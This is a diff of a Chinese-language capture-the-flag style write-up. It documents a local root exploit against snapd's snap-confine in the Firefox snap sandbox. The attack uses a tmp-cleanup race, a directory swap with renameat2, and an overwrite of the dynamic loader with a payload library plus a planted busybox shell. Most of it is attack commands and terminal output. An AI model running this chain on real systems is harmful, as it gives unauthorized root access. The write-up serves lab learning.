@@ -398,18 +398,37 @@ snap-confine 在写入过程中被阻塞。攻击者有无限的时间通过 ren
 一个设置为 SUID 的 bash 脚本会存放在此处，且不受 AppArmor 的限制，能够脱离沙盒环境持续运行。
 ```
 ### Exploitation
-
-
 #### 进入 Firefox 的 snap 安全沙箱界面，并记录下进程 ID。此进程会保持沙箱的挂载命名空间处于活动状态，其 /tmp 目录由主机上的 /tmp/snap-private-tmp/snap.firefox/tmp 进行备份。
 ----------------------------------------------------------------------
 (Terminal 1)
 ----------------------------------------------------------------------
-#### Step 1 — Enter sandbox
-<details>
-<summary>jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash</summary>
+```
+jonathan@snapped:~$ mkdir -p /tmp/.snap/usr/lib/x86_64-linux-gnu
+jonathan@snapped:~$ ls -la /tmp/.snap/usr/lib/x86_64-linux-gnu
+total 8
+drwxrwxr-x 2 jonathan jonathan 4096 Apr 13 03:26 .
+drwxrwxr-x 3 jonathan jonathan 4096 Apr 13 03:26 ..
 
+//不行：
+jonathan@snapped:~$ mount --bind /usr/lib/x86_64-linux-gnu /tmp/.snap/usr/lib/x86_64-linux-gnu
+mount: /tmp/.snap/usr/lib/x86_64-linux-gnu: must be superuser to use mount.
+       dmesg(1) may have more information after failed mount system call.
+jonathan@snapped:~$ ls -la /tmp/.snap/usr/lib/x86_64-linux-gnu/
+total 8
+drwxrwxr-x 2 jonathan jonathan 4096 Apr 13 03:08 .
+drwxrwxr-x 3 jonathan jonathan 4096 Apr 13 03:08 ..
+//不行：
+jonathan@snapped:~$ mount -t tmpfs tmpfs /usr/lib/x86_64-linux-gnu
+mount: /usr/lib/x86_64-linux-gnu: must be superuser to use mount.
+       dmesg(1) may have more information after failed mount system call.
+//原因：
+jonathan@snapped:~$ ls -l /usr/lib/snapd/snap-confine 
+-rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
+```
+#### Step 1 — Enter sandbox
 ```
 jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
+
 update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot open directory "/usr/local/share": permission denied
 update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gimp/2.0/help /usr/share/gimp/2.0/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gimp/2.0/help" because it would affect the host in "/var/lib/snapd"
 update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gtk-doc /usr/share/gtk-doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gtk-doc" because it would affect the host in "/var/lib/snapd"
@@ -419,24 +438,19 @@ update.go:85: cannot change mount namespace according to change mount (/var/lib/
 update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme /usr/share/sphinx_rtd_theme none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme" because it would affect the host in "/var/lib/snapd"
 update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
 bash: /home/jonathan/.bashrc: Permission denied
-jonathan@snapped:/home/jonathan$ snap --servion
-bash: /usr/bin/snap: Permission denied
+jonathan@snapped:/home/jonathan$
 ```
-</details>
-
-#### Step 2 — Wait for .snap deletion 
 ```
-jonathan@snapped:/home/jonathan$ cd /tmp       
+jonathan@snapped:/home/jonathan$ cd /tmp
 jonathan@snapped:/tmp$ echo $$
-3482
-jonathan@snapped:/tmp$ 
+3812
 jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done
-
+stat ./.snap
 jonathan@snapped:/tmp$ stat ./.snap
 stat: cannot statx './.snap': No such file or directory
+jonathan@snapped:/tmp$ 
+
 ```
-#### 进入 Firefox snap 沙盒并记下其进程 ID。此进程维持着沙盒的挂载名称空间的运行，其 /tmp 目录在主机上由 /tmp/snap-private-tmp/snap.firefox/tmp/ 提供支持。
-#### 使用 `touch` 保持 `/tmp` 目录处于活跃状态，同时让 `.snap` 进入休眠状态。30 天后（或手动运行 `systemctl start systemd-tmpfiles-clean.service`），清理程序会将其删除。保持终端 1 打开
 ----------------------------------------------------------------------
 (Terminal 2)
 ----------------------------------------------------------------------
@@ -451,9 +465,7 @@ total 4
 drwxrwxrwt  2 root root 4096 Apr  8 09:09 .
 drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
 ```
-#### /proc/PID/cwd 会遵循该进程的挂载命名空间视图，从而绕过了 /tmp/snap-private-tmp/ 上 700 权限（即根用户对根目录的权限）的限制。
-#### 使用 --base snapd（无效）会删除缓存的挂载命名空间，但会保留 /tmp 目录。systemd-run 包装器满足了 snap 的 cgroup 要求。出现这个错误是意料之中的，因为失败行为正是导致命名空间被破坏的原因。
-#### 我们对本文末尾所包含的辅助程序和附加文件进行了编译和上传。该辅助程序会重新创建 .snap（由攻击者控制的文件），将 285 个真实的库复制到 .exchange 文件夹中，启动 snapconfine 并通过一个小型套接字限制调试输出，检测绑定挂载触发器，并通过 renameat2(RENAME_EXCHANGE) 原子性地交换目录。snap-confine 会恢复运行并以 root 身份绑定挂载我们的文件。我们需要保持这个终端窗口打开，以使进程保持运行状态，从而保持我们被污染的命名空间的运行状态。
+
 <details>
 <summary>$ vi firefox_2404.c</summary>
 
@@ -735,6 +747,9 @@ jonathan@10.129.18.95's password:
 payload.so                                           100% 9056   935.2KB/s   00:00    
 ```
 #### 执行
+<details>
+<summary>jonathan@snapped:/proc/3799/cwd$ ls -al</summary>
+
 ```
 jonathan@snapped:/proc/3799/cwd$ ls -al
 total 4
@@ -862,6 +877,8 @@ root:root 755
 jonathan@snapped:/proc/3799/cwd$ cat race_pid.txt
 cat: race_pid.txt: No such file or directory
 ```
+</details>
+
 #### 一下子就看不见了
 #### 又执行了一遍
 ```
@@ -869,9 +886,6 @@ jonathan@snapped:/proc/3799/cwd$ cat race_pid.txt
 4877
 ```
 #### 所以，在执行$ ~/firefox_2404 ~/payload.so 不用ctrl C，然后直接在 terminal 3操作
-#### Step 4 — Destroy cached namespace 
-#### Step 5 — Win the race 
-#### 我们编译并上传了本文末尾包含的helper和有效负载。Snap（攻击者拥有），复制285个真正的库到。通过一个微小的套接字启动带有调试输出的snap限制，检测绑定挂载触发器，然后通过renameat2（RENAME_EXCHANGE）自动交换目录。快照限制简历和以root用户绑定挂载我们的文件。我们得让这个终端一直开着，这样整个过程才能继续，是什么让我们中毒的命名空间存活
 ----------------------------------------------------------------------
 Terminal 3
 ----------------------------------------------------------------------
@@ -882,6 +896,7 @@ cat: /proc/3796/cwd/race_perms/txt: No such file or directory
 jonathan@snapped:~$ cd /proc/$PID/root
 jonathan@snapped:/proc/4516/root$ stat -c '%u:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 0:root
+jonathan@snapped:~$ cd /proc/3796/cwd/ <--
 jonathan@snapped:/proc/4516/root$ cp /usr/bin/busybox ./tmp/sh
 jonathan@snapped:/proc/4516/root$ cat ~/payload.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 -bash: ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: Read-only file system
@@ -890,30 +905,23 @@ jonathan@snapped:/proc/4516/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/sna
 jonathan@snapped:/proc/4516/root$ id
 uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
 ```
-#### 不知道咋的
+
 ```
-jonathan@snapped:/proc/4516/root$ ldd /usr/lib/snapd/snap-confine
-	linux-vdso.so.1 (0x00007397b6192000)
-	libudev.so.1 => /lib/x86_64-linux-gnu/libudev.so.1 (0x00007397b6120000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007397b5e00000)
-	libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007397b6113000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007397b6194000)
-jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib64/ld-linux-x86-64.so.2
+jonathan@snapped:/proc/4498/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 root:root
-jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libcap.so.2
-root:root
-jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libc.so.6
-root:root
-jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/linux-vdso.so.1
-stat: cannot statx 'usr/linux-vdso.so.1': No such file or directory
-jonathan@snapped:/proc/4516/root$ stat -c '%U:%G' usr/lib/x86_64-linux-gnu/libudev.so.1
-root:root
-jonathan@snapped:/proc/4516/root$ cp /usr/bin/busybox ./tmp/sh
-cp: cannot create regular file './tmp/sh': No such file or directory
-```
-#### Step 6 — Overwrite dynamic loader
-#### race_pid.txt 文件中包含内层 shell 的进程 ID（PID）。race_perms.txt 确认了攻击者拥有权限。/proc/$PID/root 暴露了被污染的命名空间的文件系统。busybox 被植入为 /tmp/sh（静态二进制文件，无 ld-linux 依赖），并且 ld-linux-x86-64.so.2 被我们的 shellcode 覆盖。
-#### Step 7 — Trigger root 
+jonathan@snapped:/proc/4498/root$ cp /usr/bin/busybox ./tmp/sh
+jonathan@snapped:/proc/4498/root$ cat ~/payload.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+-bash: ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: Read-only file system
+
+jonathan@snapped:/proc/4498/root$ cd ~
+jonathan@snapped:~$ systemd-run --user --scope --unit=snap.firefox /bin/bash
+//systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
+
+Running as unit: snap.firefox.scope; invocation ID: 0b27347feec642f6904d095ae6d3e16a
+
+jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+/usr/lib/snapd/snap-confine: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by /usr/lib/snapd/snap-confine)
+``` 
 ----------------------------------------------------------------------
 Busybox shell
 ----------------------------------------------------------------------
